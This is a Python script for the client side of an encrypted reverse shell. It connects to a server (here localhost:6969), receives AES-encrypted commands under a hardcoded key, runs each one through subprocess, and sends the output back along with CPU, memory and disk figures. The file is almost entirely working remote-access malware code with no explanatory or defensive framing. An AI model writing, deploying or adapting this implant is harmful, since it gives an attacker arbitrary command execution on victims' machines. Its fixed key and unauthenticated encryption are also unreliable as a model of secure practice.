import socket
import json
import subprocess
import os
import logging
import psutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes


def aes_encrypt(plaintext, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return cipher.iv + ct_bytes

def aes_decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    ct = ciphertext[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ct), AES.block_size)
    return decrypted.decode()

key = b'just for test123'


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = "localhost"
PORT = 6969

try:
    s.connect((HOST, PORT))
    logging.info("Connected to server at %s:%s", HOST, PORT)
except Exception as e:
    logging.error("Connection failed: %s", e)
    exit(1)

def send(data):
    msg = json.dumps(data)
    encrypted_msg = aes_encrypt(msg, key)
    s.send(encrypted_msg)

def recv() -> str:
    data = b""
    try:
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
            try:
                decrypted = aes_decrypt(data, key)
                return json.loads(decrypted)
            except ValueError:
                continue
    except Exception as e:
        return None

def shell():
    try:
        while True:
            command = recv()
            if not command:
                logging.info("No command received. Closing connection.")
                break
            
            if command.startswith("cd"):
                try:
                    os.chdir(command.split(maxsplit=1)[1])
                    output = f"Changed to {os.getcwd()}"
                except Exception as e:
                    output = f"Error: {e}"
            elif command.lower() == "utils":
                output = ("####CPUM#### " + f"{psutil.cpu_percent(interval=1)}-{psutil.virtual_memory().percent}-{psutil.disk_usage('/').percent}")
            else:
                try:
                    output = subprocess.getoutput(command)
                except Exception as e:
                    output = f"Error executing command: {e}"
            
            send(output)
    except Exception as e:
        logging.error("Error in shell loop: %s", e)
    finally:
        s.close()
        logging.info("Connection closed.")

if __name__ == "__main__":
    shell()
